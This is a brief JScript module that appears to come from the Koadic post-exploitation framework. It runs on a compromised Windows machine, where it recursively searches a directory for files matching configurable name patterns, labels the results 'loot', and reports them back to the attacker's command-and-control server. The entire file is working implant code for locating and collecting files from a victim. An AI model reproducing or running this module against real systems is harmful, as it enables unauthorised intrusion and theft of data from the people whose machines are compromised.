try
{
    var tmpfile = "~DIRECTORY~\\" + Koadic.uuid() + ".txt";
    var loot = Koadic.shell.exec("dir ~LOOTD~ /s /b | findstr /I \"~LOOTE~ ~LOOTF~\"", tmpfile);
    Koadic.work.report(loot);
}
catch (e)
{
    Koadic.work.error(e)
}

Koadic.exit();
